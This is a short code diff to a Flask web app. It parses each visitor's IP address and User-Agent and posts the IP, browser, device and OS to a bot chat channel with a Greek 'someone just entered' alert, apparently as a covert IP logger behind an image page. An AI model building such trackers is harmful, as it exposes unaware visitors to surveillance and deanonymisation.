@@ -1,5 +1,5 @@
 from flask import Flask, url_for, request
-import tempfile, base64
+import tempfile, base64, user_agents
 from bot import sendMessage, sendImage
 
 channel = 340282366841710301281180646637327430260
@@ -18,6 +18,9 @@ async def home():
     image_url = url_for("static", filename="images/zoobie.jpg")
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
+    agent = user_agents.parse(user_agent)
+
+    await send(f"🥳 Kapoios ameas mphke!\n♨️ Oi plhrofories tou:\n\n🌐 IP: {user_ip}\n🦊 Browser: {agent.browser}\n📱 Suskeuh: {agent.device}\n🚀 Leitourgiko: {agent.os}")
 
     return """
 
